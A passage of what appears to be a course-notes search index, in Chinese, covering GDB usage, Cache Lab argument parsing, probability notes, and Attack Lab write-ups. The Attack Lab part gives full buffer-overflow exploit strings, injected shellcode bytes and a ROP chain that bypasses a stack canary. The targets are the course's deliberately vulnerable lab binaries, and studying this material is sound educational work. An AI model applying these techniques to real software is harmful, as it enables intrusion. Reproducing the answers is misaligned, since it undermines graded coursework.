explode_bomb</code>\u200b\u5728\u200b\u70b8\u5f39\u200b\u7206\u70b8\u200b\u4f4d\u7f6e\u200b\u6253\u200b\u4e0a\u200b\u65ad\u70b9\u200b, \u200b\u9632\u6b62\u200b\u70b8\u5f39\u200b\u7206\u70b8\u200b.</p> <p><code>p</code> \u200b\u547d\u4ee4\u200b\u7528\u4e8e\u200b\u6253\u5370\u200b\u8868\u8fbe\u5f0f\u200b, <code>x</code> \u200b\u547d\u4ee4\u200b\u7528\u4e8e\u200b\u68c0\u67e5\u200b\u5185\u5b58\u200b\u7684\u200b\u5185\u5bb9\u200b</p> <p></p> <p>\u200b\u5728\u200b <code>/</code> \u200b\u540e\u9762\u200b\u7684\u200b\u540e\u7f00\u200b\u5236\u5b9a\u200b\u4e86\u200b\u67e5\u770b\u200b\u5185\u5b58\u200b\u7684\u200b\u65b9\u5f0f\u200b\u548c\u200b\u6570\u91cf\u200b:</p> <ul> <li>\u200b\u7b2c\u4e00\u4e2a\u200b\u6570\u5b57\u200b, \u200b\u5982\u200b <code>2</code> \u200b\u6307\u5b9a\u200b\u8981\u200b\u67e5\u770b\u200b\u7684\u200b\u5355\u4f4d\u200b\u6570\u91cf\u200b</li> <li>\u200b\u7b2c\u4e8c\u4e2a\u200b\u5b57\u6bcd\u200b (<code>x</code>, <code>d</code> \u200b\u7b49\u200b) \u200b\u5236\u5b9a\u200b\u5355\u4f4d\u200b\u7c7b\u578b\u200b\u548c\u200b\u663e\u793a\u200b\u683c\u5f0f\u200b</li> <li>c/d/x \u200b\u8868\u793a\u200b\u5e94\u8be5\u200b\u4ee5\u200b character/decimal/hexadecimal \u200b\u683c\u5f0f\u200b\u663e\u5f0f\u200b</li> <li>s \u200b\u8868\u793a\u200b\u5e94\u8be5\u200b\u4ee5\u200b c-style string \u200b\u663e\u793a\u200b</li> <li>b/h/w/g \u200b\u8868\u793a\u200b\u5e94\u8be5\u200b\u4ee5\u200b byte/2byte(half-word)/4byte(word)/8byte(giant) \u200b\u4e3a\u200b\u5355\u4f4d\u200b\u663e\u793a\u200b(\u200b\u4e4b\u540e\u200b\u7684\u200b\u6253\u5370\u200b\u90fd\u200b\u4f1a\u200b\u4ee5\u200b\u8fd9\u4e2a\u200b\u5355\u4f4d\u200b, \u200b\u76f4\u5230\u200b\u4f7f\u7528\u200b\u65b0\u200b\u7684\u200b\u5355\u4f4d\u200b\u6253\u5370\u200b)</li> </ul> <p>.gdbinit \u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u7528\u6237\u200b\u5728\u200b\u5f00\u59cb\u200b\u65f6\u200b\u4f7f\u7528\u200b\u4e00\u4e9b\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b</p> <p></p> <p></p> <p><code>mkdir -p</code> \u200b\u4ee3\u8868\u200b\u5982\u679c\u200b\u7236\u200b\u76ee\u5f55\u200b\u4e0d\u200b\u5b58\u5728\u200b\u4e00\u5e76\u200b\u521b\u5efa\u200b</p>"},{"location":"notes/ICS/Lab/#attack-lab","title":"Attack Lab","text":""},{"location":"notes/ICS/Lab/#0","title":"0. \u200b\u80cc\u666f","text":"<p>\u200b\u901a\u8fc7\u200b\u7f13\u51b2\u533a\u200b\u6ea2\u51fa\u200b\u690d\u5165\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b/gadget\u200b\u4ee3\u7801\u200b</p>"},{"location":"notes/ICS/Lab/#1_1","title":"1. \u200b\u5e38\u7528\u547d\u4ee4","text":"Bash<pre><code>&gt; ./ctarget ./rtarget ./starget target\u200b\u7a0b\u5e8f\u200b\n&gt; ./ctarget -h \u200b\u6253\u5370\u200b\u53ef\u7528\u200b\u547d\u4ee4\u884c\u200b\u53c2\u6570\u200b\n&gt; ./ctarget -i FILE \u200b\u4f7f\u7528\u200b FILE \u200b\u6587\u4ef6\u200b\u4f5c\u4e3a\u200b\u8f93\u5165\u200b\n&gt; ./ctarget -q \u200b\u672c\u5730\u200b\u653b\u51fb\u200b\n</code></pre> <p>Note</p> <p>exploit string \u200b\u4e0d\u80fd\u200b\u6709\u200b <code>0x0a</code> , \u200b\u56e0\u4e3a\u200b\u8fd9\u662f\u200b '\\n' \u200b\u7684\u200b ASCII \u200b\u7801\u200b, \u200b\u4f1a\u200b\u4e2d\u65ad\u200b Gets</p>"},{"location":"notes/ICS/Lab/#2-hex2raw","title":"2. HEX2RAW","text":"<p>Hex2raw \u200b\u63a5\u53d7\u200b\u4e00\u4e2a\u200b\u5341\u516d\u8fdb\u5236\u200b\u5f62\u5f0f\u200b\u7684\u200b\u5b57\u7b26\u4e32\u200b, \u200b\u6bcf\u4e2a\u200b\u6bd4\u7279\u200b\u7528\u200b\u4e24\u4f4d\u200b\u5341\u516d\u8fdb\u5236\u200b\u6570\u200b\u8868\u793a\u200b, \u200b\u4ee5\u200b\u7a7a\u683c\u200b\u9694\u5f00\u200b, \u200b\u8fd4\u56de\u200b\u4e00\u4e2a\u200b ASCII\u200b\u7801\u4e3a\u200b\u5bf9\u5e94\u200b\u5b57\u7b26\u4e32\u200b\u7684\u200b\u5b57\u7b26\u4e32\u200b. (0 \u200b\u4e5f\u200b\u5fc5\u987b\u200b\u7528\u200b 00)</p> <p>\u200b\u4f8b\u5982\u200b <code>\"012345\"</code> \u200b\u7684\u200b\u5341\u516d\u8fdb\u5236\u200b\u5f62\u5f0f\u200b\u662f\u200b <code>30 31 32 33 34 35 00</code></p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u60f3\u200b\u6ce8\u91ca\u200b, \u200b\u8bf7\u200b\u5728\u200b <code>/*</code> \u200b\u548c\u200b <code>*/</code> \u200b\u7684\u200b\u540e\u9762\u200b/\u200b\u524d\u9762\u200b\u7559\u4e0b\u200b\u4e00\u4e2a\u200b\u7a7a\u683c\u200b.</p> <p>\u200b\u53ef\u4ee5\u200b\u6709\u200b\u51e0\u79cd\u200b\u65b9\u5f0f\u200b\u5c06\u200b raw string \u200b\u4f20\u7ed9\u200b ctarget/rtarget/starget</p> Bash<pre><code>&gt; cat exploit.txt | ./hex2raw | ./ctarget // using pipe\n&gt; ./hex2raw &lt; exploit.txt &gt; exploit-raw.txt // using I/O redirection\n&gt; ./ctarget &lt; exploit-raw.txt\n&gt; gdb can also do this\n&gt; (gdb) run &lt; exploit-raw.txt\n&gt; ./ctarget -i exploit-raw.txt // or use cmdline argument\n</code></pre>"},{"location":"notes/ICS/Lab/#3-byte-codes","title":"3. \u200b\u751f\u6210\u200b Byte Codes","text":"<p>\u200b\u5229\u7528\u200b GCC \u200b\u4f5c\u4e3a\u200b\u6c47\u7f16\u5668\u200b, OBJDUMP \u200b\u4f5c\u4e3a\u200b\u53cd\u200b\u6c47\u7f16\u5668\u200b\u53ef\u4ee5\u200b\u7b80\u5355\u200b\u5730\u200b\u751f\u6210\u200b byte codes.</p> <p>\u200b\u4f8b\u5982\u200b, \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5199\u200b\u4e00\u4e2a\u200b <code>example.s</code> \u200b\u5305\u542b\u200b\u4ee5\u4e0b\u200b\u6c47\u7f16\u200b\u4ee3\u7801\u200b.</p> Text Only<pre><code>pushq $0xabcdef # Push value onto stack\naddq $17, %rax # Add 17 to %rax\nmovl %eax, %eax # Copy lower 32 bits to %edx\n</code></pre> <p>\u200b\u63a5\u7740\u200b\u5229\u7528\u200b gcc \u200b\u548c\u200b objdump \u200b\u751f\u6210\u200b\u53cd\u6c47\u7f16\u200b\u6587\u4ef6\u200b.</p> Bash<pre><code>&gt; gcc -c example.s\n&gt; objdump -d example.o &gt; example.d\n</code></pre> <p><code>example.d</code> \u200b\u4f1a\u200b\u5305\u542b\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b:</p> <p></p> <p>\u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u5c31\u200b\u5f97\u5230\u200b\u6c47\u7f16\u200b\u4ee3\u7801\u200b\u7684\u200b byte code \u200b\u4e86\u200b:</p> <p><code>68 ef cd ab 00 48 83 c0 11 89 c2</code></p> <p>\u200b\u62ff\u5230\u200b HEX2RAW \u200b\u751f\u6210\u200b \u200b\u5bf9\u5e94\u200b\u7684\u200b\u8f93\u5165\u200b\u5b57\u7b26\u4e32\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b\u653b\u51fb\u200b\u4e86\u200b.</p> <p>GCC \u200b\u5e38\u7528\u200b\u53c2\u6570\u200b:</p> <ul> <li>gcc -c hello.c \u200b\u6fc0\u6d3b\u200b\u9884\u5904\u7406\u200b, \u200b\u7f16\u8bd1\u200b\u548c\u200b\u6c47\u7f16\u200b, \u200b\u751f\u6210\u200b .o \u200b\u7684\u200b obj \u200b\u6587\u4ef6\u200b</li> <li>gcc -S hello.c \u200b\u6fc0\u6d3b\u200b\u9884\u5904\u7406\u200b, \u200b\u7f16\u8bd1\u200b, \u200b\u628a\u200b\u6587\u4ef6\u200b\u7f16\u8bd1\u6210\u200b .s \u200b\u7684\u200b\u6c47\u7f16\u200b\u4ee3\u7801\u200b</li> <li>gcc -E hello.c &gt; hello.txt \u200b\u53ea\u200b\u6fc0\u6d3b\u200b\u9884\u5904\u7406\u200b, \u200b\u4e0d\u200b\u751f\u6210\u200b\u6587\u4ef6\u200b, \u200b\u9700\u8981\u200b\u91cd\u5b9a\u5411\u200b</li> <li>gcc -o \u200b\u5236\u5b9a\u200b\u76ee\u6807\u200b\u540d\u79f0\u200b</li> </ul>"},{"location":"notes/ICS/Lab/#4-phase-1","title":"4. Phase 1","text":"<p>\u200b\u6ce8\u610f\u200b <code>touch1</code> \u200b\u7684\u200b\u5730\u5740\u200b\u662f\u200b 0x0000000000401d1d , \u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u8981\u200b\u8ba9\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\u53d8\u6210\u200b\u8fd9\u4e2a\u200b.</p> <p>\u200b\u6ce8\u610f\u200b\u690d\u5165\u200b\u7684\u200b\u987a\u5e8f\u200b, \u200b\u56e0\u4e3a\u200b\u673a\u5668\u200b\u662f\u200b\u5c0f\u7aef\u6cd5\u200b, \u200b\u800c\u6808\u200b\u662f\u200b\u5411\u200b\u4f4e\u200b\u5730\u5740\u200b\u589e\u957f\u200b, \u200b\u5b57\u7b26\u4e32\u200b\u690d\u5165\u200b\u7684\u200b\u65f6\u5019\u200b\u662f\u200b\u5411\u4e0a\u200b\u589e\u957f\u200b, \u200b\u6240\u4ee5\u200b\u524d\u9762\u200b\u8bfb\u5230\u200b\u7684\u200b\u4f4d\u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b\u4f4e\u200b\u5730\u5740\u200b.</p> <p>\u200b\u5982\u679c\u200b\u8981\u200b\u690d\u5165\u200b0x0000000000401d1d, \u200b\u5c31\u8981\u200b\u8f93\u5165\u200b <code>1d 1d 40 00 00 00 00 00</code> </p> <p>\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u6c47\u7f16\u200b\u4ee3\u7801\u200b\u770b\u51fa\u200b bufsize \u200b\u662f\u200b 56, \u200b\u6240\u4ee5\u200b\u524d\u9762\u200b\u53ef\u4ee5\u200b\u5148\u200b\u586b\u5145\u200b 56 \u200b\u4e2a\u200b 0</p> <p>\u200b\u7b54\u6848\u200b:</p> Text Only<pre><code>00 01 02 03 04 05 06 07\n00 01 02 03 04 05 06 07\n00 01 02 03 04 05 06 07\n00 01 02 03 04 05 06 07\n00 01 02 03 04 05 06 07\n00 01 02 03 04 05 06 07\n00 01 02 03 04 05 06 07\n1d 1d 40 00 00 00 00 00\n</code></pre>"},{"location":"notes/ICS/Lab/#5-phase-2","title":"5. Phase 2","text":"<p>Phase2 \u200b\u9700\u8981\u200b\u628a\u200b cookie \u200b\u4f20\u5165\u200b touch2 \u200b\u4e2d\u200b.</p> <p>\u200b\u5229\u7528\u200b\u6c47\u7f16\u200b\u547d\u4ee4\u200b</p> GAS<pre><code>mov $0x71b890e0, %rdi\npushq $0x401d51\nret\n</code></pre> <p>\u200b\u6808\u4e0a\u200b\u7684\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\u8981\u200b\u5b9a\u4f4d\u200b\u5230\u200b\u8bfb\u5165\u200b\u4f4d\u7f6e\u200b\u7684\u200b\u5730\u5740\u200b, \u200b\u5373\u200b\u4e00\u200b\u5f00\u59cb\u200b $rsp-0x38 \u200b\u7684\u200b\u503c\u200b, \u200b\u8fd9\u6837\u200b\u624d\u200b\u53ef\u4ee5\u200b\u6267\u884c\u200b\u6211\u4eec\u200b\u690d\u5165\u200b\u7684\u200b\u4ee3\u7801\u200b.</p> Text Only<pre><code>48 c7 c7 e0 90 b8 71\n68 51 1d 40 00\nc3\n00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n68 9a 61 55 00 00 00 00\n</code></pre>"},{"location":"notes/ICS/Lab/#6-phase3","title":"6. Phase3","text":"<p>\u200b\u8981\u200b\u628a\u200b cookie \u200b\u7684\u200b\u5341\u516d\u8fdb\u5236\u200b\u8868\u793a\u200b\u6ce8\u5165\u200b\u5230\u200b\u67d0\u4e2a\u200b\u4f4d\u7f6e\u200b. \u200b\u6ce8\u610f\u200b\u4f4e\u200b\u5730\u5740\u200b\u7684\u200b\u662f\u200b\u4f4e\u4f4d\u200b, \u200b\u6bd4\u8f83\u200b\u7684\u200b\u65f6\u5019\u200b\u662f\u200b\u4ece\u5934\u5f00\u59cb\u200b\u6bd4\u8f83\u200b, \u200b\u6240\u4ee5\u200b\u4f4e\u200b\u5730\u5740\u200b\u5e94\u8be5\u200b\u653e\u200b\u6700\u9ad8\u200b\u4f4d\u200b\u7684\u200b\u5b57\u7b26\u200b\u8868\u793a\u200b ASCII \u200b\u7801\u200b.</p> Text Only<pre><code>leaq 4096(%rsp), %rdi\nmovl $0x38623137, 4096(%rsp)\nmovl $0x30653039, 4100(%rsp)\nmovl $0, 4104(%rsp)\npushq $0x401e77\nret\n</code></pre>"},{"location":"notes/ICS/Lab/#7-rop","title":"7. ROP","text":"<p>\u200b\u5c06\u200b\u51fd\u6570\u200b\u7684\u200b\u4ee3\u7801\u200b\u7684\u200b\u5730\u5740\u200b\u690d\u5165\u200b\u6808\u4e2d\u200b (\u200b\u5982\u679c\u200b\u6709\u200b\u504f\u79fb\u200b\u8981\u200b\u8bb0\u5f97\u200b\u52a0\u4e0a\u200b\u504f\u79fb\u91cf\u200b, \u200b\u6bd4\u5982\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u7684\u200b\u4ee3\u7801\u200b\u662f\u4ece\u200b\u8fd9\u4e2a\u200b\u6307\u4ee4\u200b\u7684\u200b\u7b2c\u4e8c\u4e2a\u200b\u5b57\u8282\u200b\u624d\u200b\u5f00\u59cb\u200b\u7684\u200b, \u200b\u5730\u5740\u200b\u5c31\u8981\u200b+1)</p> <p>\u200b\u5229\u7528\u200b\u8fd9\u4e2a\u200b\u4ee3\u7801\u200b\u7ed3\u5c3e\u200b\u662f\u200b ret , \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u4e00\u76f4\u200b\u8df3\u200b\u5230\u200b\u6267\u884c\u200b\u6211\u4eec\u200b\u690d\u5165\u200b\u6808\u4e2d\u200b\u7684\u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5730\u5740\u200b.</p> <p>\u200b\u5269\u4e0b\u200b\u7684\u200b\u5c31\u662f\u200b\u5728\u200b farm \u200b\u4e2d\u200b\u627e\u200b gadget \u200b\u4efb\u52a1\u200b\u4e86\u200b</p> <p>\u200b\u6ce8\u610f\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u63d2\u5165\u200b\u4e00\u4e9b\u200b\u6ca1\u6709\u200b\u6548\u679c\u200b\u7684\u200b\u6307\u4ee4\u200b, \u200b\u6bd4\u5982\u200b 90 (nop), andb %al, %al \u200b\u7b49\u200b</p>"},{"location":"notes/ICS/Lab/#8-phase-6","title":"8. Phase 6","text":"<p>\u200b\u6ce8\u610f\u200b memcpy(dest, source) \u200b\u5c06\u200b source \u200b\u4f4d\u7f6e\u200b\u7684\u200b\u4ee3\u7801\u200b\u590d\u5236\u5230\u200b dest \u200b\u4f4d\u7f6e\u200b.</p> <p>\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5c0f\u200b\u5de7\u601d\u200b, \u200b\u6ce8\u610f\u200b\u5230\u200b memcpy \u200b\u5728\u200b\u8fd4\u56de\u200b\u65f6\u200b\u4e5f\u200b\u4f1a\u200b\u6267\u884c\u200b\u5f53\u524d\u200b\u6808\u4e2d\u200b %rsp \u200b\u5904\u200b\u7684\u200b\u5730\u5740\u200b, \u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b memcpy \u200b\u5c06\u200b\u6211\u4eec\u200b\u7684\u200b\u5730\u5740\u200b\u66ff\u6362\u200b\u4e3a\u200b\u5b83\u200b\u8fd4\u56de\u200b\u7684\u200b\u5730\u5740\u200b (\u200b\u8fd4\u56de\u200b\u7684\u200b\u5730\u5740\u200b\u662f\u200b\u5728\u200b $rsp - 8) \u200b\u5904\u200b. \u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u65e2\u200b\u5229\u7528\u200b\u4e86\u200b memcpy \u200b\u7684\u200b\u590d\u5236\u200b\u529f\u80fd\u200b, \u200b\u53c8\u200b\u5229\u7528\u200b\u4e86\u200b\u51fd\u6570\u200b\u8fd4\u56de\u200b\u7684\u200b\u884c\u4e3a\u200b.</p> <p>\u200b\u5728\u200b starget.s \u200b\u4e2d\u200b\u6211\u4eec\u200b\u53d1\u73b0\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u8ba1\u7b97\u200b\u662f\u200b %rsp + %rax, \u200b\u800c\u200b %rax \u200b\u662f\u200b\u5b58\u653e\u200b\u5728\u200b %rbp-0x1c \u200b\u4f4d\u7f6e\u200b\u7684\u200b\u6570\u636e\u200b, \u200b\u4e8e\u662f\u200b\u6211\u4eec\u200b\u5229\u7528\u200b\u7f13\u51b2\u533a\u200b\u6ea2\u51fa\u200b\u66f4\u6539\u200b %rax \u200b\u7684\u200b\u503c\u200b\u4e3a\u200b -8, \u200b\u8fd9\u6837\u200b\u590d\u5236\u5230\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u5c31\u662f\u200b %rsp-8 \u200b\u800c\u200b\u4e0d\u662f\u200b %rsp \u200b\u4e86\u200b.</p> Text Only<pre><code>f5 20 40 00 00 00 00 00 /* mov %rsp, %rax */ \n6d 1f 40 00 00 00 00 00 /* mov %rax, %rdi &lt;- %rdi (buffer+64) */\n83 1f 40 00 00 00 00 00 /* popq %rax */\n48 00 00 00 00 00 00 00 /* offset */\n8c 20 40 00 00 00 00 00 /* mov %eax, %ecx */\n41 20 40 00 00 00 00 00 /* mov %ecx, %edx */\n4c 20 40 00 00 00 00 00 /* mov %edx, %esi */\nc2 1f 40 00 00 00 00 00 /* lea (%rdi,%rsi,1), %rax */\n6d 1f 40 00 00 00 00 00 /* mov %rax, %rdi */\n0c 1e 40 00 00 00 00 00 /* touch3 */\n37 31 62 38 39 30 65 30 /* cookie (buffer + 136) */\n00 00 00 00 00 00 00 00 /* 0 */\n00 00 00 00 00 00 00 00 /* 0 */\n00 00 00 00 00 00 00 00 /* 0 */\n00 00 00 00 00 00 00 00 /* 0 */\n00 00 00 00 00 00 00 00 /* 0 */\n00 00 00 00 f8 ff ff ff /* -8 */\n</code></pre> <p>(\u200b\u597d\u50cf\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u770b\u5230\u200b\u6709\u200b\u8ddf\u200b\u6211\u200b\u4e00\u6837\u200b\u5229\u7528\u200b memcpy \u200b\u8fd4\u56de\u200b\u800c\u200b\u4e0d\u662f\u200b getbuf_with_canary \u200b\u8fd4\u56de\u200b\u7684\u200b?)</p>"},{"location":"notes/ICS/Lab/#arch-lab","title":"Arch Lab","text":""},{"location":"notes/ICS/Lab/#part-a","title":"Part A","text":"<p>\u200b\u7f16\u5199\u200b y86-64 \u200b\u7a0b\u5e8f\u200b.</p> <p>\u200b\u4f7f\u7528\u200b <code>cargo build</code> \u200b\u6784\u5efa\u200b\u9879\u76ee\u200b, \u200b\u4f7f\u7528\u200b <code>./target/debug/yas</code> \u200b\u8fdb\u884c\u200b\u6c47\u7f16\u200b, \u200b\u4f7f\u7528\u200b <code>./target/debug/yis</code> \u200b\u8fdb\u884c\u200b\u6a21\u62df\u200b.</p>"},{"location":"notes/ICS/Lab/#cache-lab","title":"Cache Lab","text":""},{"location":"notes/ICS/Lab/#part-a_1","title":"Part A","text":""},{"location":"notes/ICS/Lab/#getopt","title":"getopt","text":"C<pre><code>#include &lt;unistd.h&gt;\n\nint getopt(int argc, char * const argv[], const char *optstring);\n</code></pre> <p>optstring \u200b\u662f\u200b\u4e00\u4e2a\u200b\u9009\u9879\u200b\u63cf\u8ff0\u200b\u8868\u200b, \u200b\u6bcf\u4e2a\u200b\u5b57\u7b26\u200b\u4ee3\u8868\u200b\u4e00\u4e2a\u200b\u5408\u6cd5\u200b\u9009\u9879\u200b. \u200b\u5b57\u7b26\u200b\u540e\u5e26\u200b\u5192\u53f7\u200b\u8868\u793a\u200b\u8be5\u200b\u9009\u9879\u200b\u9700\u8981\u200b\u53c2\u6570\u200b. \u200b\u5e26\u200b\u4e00\u4e2a\u200b\u5192\u53f7\u200b\u4ee3\u8868\u200b\u5fc5\u987b\u200b\u8981\u200b\u53c2\u6570\u200b. \u200b\u4e24\u4e2a\u200b\u5192\u53f7\u200b\u4ee3\u8868\u200b\u53ef\u4ee5\u200b\u6709\u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u6ca1\u6709\u200b\u53c2\u6570\u200b, \u200b\u4f46\u662f\u200b\u6709\u200b\u53c2\u6570\u200b\u7684\u8bdd\u200b\u9009\u9879\u200b\u548c\u200b\u53c2\u6570\u200b\u4e4b\u95f4\u200b\u4e0d\u80fd\u200b\u6709\u200b\u7a7a\u683c\u200b.</p> <p>\u200b\u8fd4\u56de\u503c\u200b</p> <p>\u200b\u8fd4\u56de\u200b\u8bc6\u522b\u200b\u5230\u200b\u7684\u200b\u9009\u9879\u200b\u5b57\u7b26\u200b\uff08\u200b\u5982\u200b 'a'\u3001'b'\uff09, \u200b\u6240\u6709\u200b\u9009\u9879\u200b\u5904\u7406\u5b8c\u6bd5\u200b\u540e\u200b\uff0c\u200b\u8fd4\u56de\u200b -1</p> <p>\u200b\u9519\u8bef\u200b\u60c5\u51b5\u200b</p> <p>\u200b\u9047\u5230\u200b\u672a\u77e5\u200b\u9009\u9879\u200b\u6216\u200b\u7f3a\u5931\u200b\u53c2\u6570\u200b, \u200b\u9ed8\u8ba4\u200b\u884c\u4e3a\u200b\uff1a\u200b\u8fd4\u56de\u200b '?', \u200b\u5e76\u200b\u5411\u200b stderr \u200b\u8f93\u51fa\u200b\u9519\u8bef\u4fe1\u606f\u200b</p> <p>\u200b\u5982\u679c\u200b\u60f3\u200b\u5b9e\u73b0\u200b\u66f4\u200b\u7cbe\u7ec6\u200b\u7684\u200b\u53c2\u6570\u200b\u63a7\u5236\u200b, \u200b\u8bf7\u200b\u67e5\u9605\u200b <code>getopt_long</code></p> C<pre><code>const char* optstr = \"hvs:E:b:t:\";\n\n// process command line arguments.\nvoid process_arguments(int argc, char* argv[]) {\n    char arg;\n    while ((arg = getopt(argc, argv, optstr)) != -1) {\n        switch (arg) {\n            case 'h':\n                print_help_message(argv[0]);\n                exit(0);\n                break;\n            case 'v':\n                verbose_flag = true;\n                break;\n            case 's':\n                set_index_bits = atoi(optarg);\n                break;\n            case 'E':\n                lines_per_set = atoi(optarg);\n                break;\n            case 'b':\n                block_offset_bits = atoi(optarg);\n                break;\n            case 't':\n                file_name = optarg;\n                break;\n            case '?':\n                print_help_message(argv[0]);\n                exit(1);\n                break;\n        }\n    }\n    if (set_index_bits &lt; 0 || lines_per_set &lt;= 0 || block_offset_bits &lt; 0) {\n        printf(\"%s: Missing required command line argument\\n\", argv[0]);\n        print_help_message(argv[0]);\n        exit(1);\n    }\n    S = (uint64_t)1 &lt;&lt; set_index_bits;\n    E = lines_per_set;\n    B = (uint64_t)1 &lt;&lt; block_offset_bits;\n}\n</code></pre>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%200%20%E5%89%8D%E8%A8%80/","title":"Chapter 0 \u200b\u524d\u8a00","text":"<p>\u200b\u672c\u200b\u7b14\u8bb0\u200b\u6839\u636e\u200b\u5317\u4eac\u5927\u5b66\u200b 2025 \u200b\u6625\u5b63\u200b\u8bfe\u7a0b\u200b \u300aAI \u200b\u4e2d\u200b\u7684\u200b\u6570\u5b66\u200b\u300b\u200b\u8bb2\u4e49\u200b\u6574\u7406\u200b</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2001%20%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/","title":"Chapter 01 \u200b\u968f\u673a\u200b\u4e8b\u4ef6\u200b\u4e0e\u200b\u6982\u7387","text":""},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2001%20%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#_1","title":"\u672c\u7ae0\u200b\u4e3b\u8981\u200b\u5185\u5bb9","text":"<ul> <li>\u200b\u968f\u673a\u200b\u4e8b\u4ef6\u200b, \u200b\u6837\u672c\u7a7a\u95f4\u200b, \u200b\u6837\u672c\u200b\u70b9\u200b\u6982\u5ff5\u200b (\u200b\u638c\u63e1\u200b)</li> <li>\u200b\u4e8b\u4ef6\u200b\u4e0e\u200b\u6982\u7387\u200b\u7684\u200b\u8fd0\u7b97\u200b (\u200b\u638c\u63e1\u200b)</li> <li>\u200b\u6982\u7387\u200b\u516c\u7406\u200b\u5b9a\u4e49\u200b (\u200b\u4e86\u89e3\u200b)</li> <li>\u200b\u53e4\u5178\u200b\u6982\u578b\u200b (\u200b\u638c\u63e1\u200b)</li> <li>\u200b\u6761\u4ef6\u200b\u6982\u7387\u200b, \u200b\u72ec\u7acb\u6027\u200b (\u200b\u638c\u63e1\u200b)</li> <li>\u200b\u8d1d\u53f6\u65af\u200b\u516c\u5f0f\u200b\u548c\u200b\u5168\u200b\u6982\u7387\u200b\u516c\u5f0f\u200b (\u200b\u638c\u63e1\u200b)</li> </ul>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2001%20%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#11","title":"1.1 \u200b\u968f\u673a\u200b\u4e8b\u4ef6\u200b\u53ca\u5176\u200b\u6982\u7387","text":"<p>\u200b\u5b9a\u4e49\u200b 1.1 \u200b\u968f\u673a\u200b\u5b9e\u9a8c\u200b</p> <p>\u200b\u51e1\u200b\u6ee1\u8db3\u200b\u4ee5\u4e0b\u200b\u6761\u4ef6\u200b\u7684\u200b\u8fc7\u7a0b\u200b \u200b\u968f\u673a\u200b\u5b9e\u9a8c\u200b:</p> <p>(1) \u200b\u5728\u200b\u76f8\u540c\u200b\u6761\u4ef6\u200b\u4e0b\u200b\u53ef\u4ee5\u200b\u91cd\u590d\u200b\u8fdb\u884c\u200b;</p> <p>(2) \u200b\u53ef\u80fd\u200b\u51fa\u73b0\u200b\u4e24\u4e2a\u200b\u6216\u200b\u4e24\u4e2a\u200b\u4ee5\u4e0a\u200b\u4e0d\u540c\u200b\u7684\u200b\u7ed3\u679c\u200b;</p> <p>(3) \u200b\u5728\u200b\u5b9e\u9a8c\u200b\u8fdb\u884c\u200b\u4e4b\u524d\u200b\u4e0d\u80fd\u200b\u786e\u5b9a\u200b\u54ea\u200b\u4e00\u4e2a\u200b\u7ed3\u679c\u200b\u4f1a\u200b\u51fa\u73b0\u200b.</p> <p>\u200b\u968f\u673a\u200b\u5b9e\u9a8c\u200b\u901a\u5e38\u200b\u7b80\u79f0\u200b\u4e3a\u200b\u5b9e\u9a8c\u200b,\u200b\u53ef\u8bb0\u4f5c\u200b \\(E\\).</p> <p>\u200b\u867d\u7136\u200b\u5355\u6b21\u200b\u5b9e\u9a8c\u200b\u7684\u200b\u7ed3\u679c\u200b\u662f\u200b\u4e0d\u80fd\u200b\u63d0\u524d\u200b\u786e\u5b9a\u200b\u7684\u200b,\u200b\u4f46\u200b\u6240\u6709\u200b\u53ef\u80fd\u200b\u7684\u200b\u7ed3\u679c\u200b\u53ef\u4ee5\u200b\u9884\u5148\u200b\u77e5\u9053\u200b. \u200b\u4e3a\u4e86\u200b\u7814\u7a76\u200b\u968f\u673a\u200b\u73b0\u8c61\u200b, \u200b\u6211\u4eec\u200b\u4e0d\u4ec5\u200b\u9700\u8981\u200b\u8003\u5bdf\u200b\u8fd9\u4e9b\u200b\u7ed3\u679c\u200b\u7684\u200b\u603b\u4f53\u200b, \u200b\u8fd8\u8981\u200b\u5bf9\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u7ed3\u679c\u200b\u672c\u8eab\u200b\u52a0\u4ee5\u200b\u533a\u5206\u200b, \u200b\u8fd9\u200b\u5c31\u200b\u5f15\u51fa\u200b\u4e86\u200b\u6837\u672c\u7a7a\u95f4\u200b\u548c\u200b\u6837\u672c\u200b\u70b9\u200b\u7684\u200b\u6982\u5ff5\u200b.</p> <p>\u200b\u5b9a\u4e49\u200b 1.2 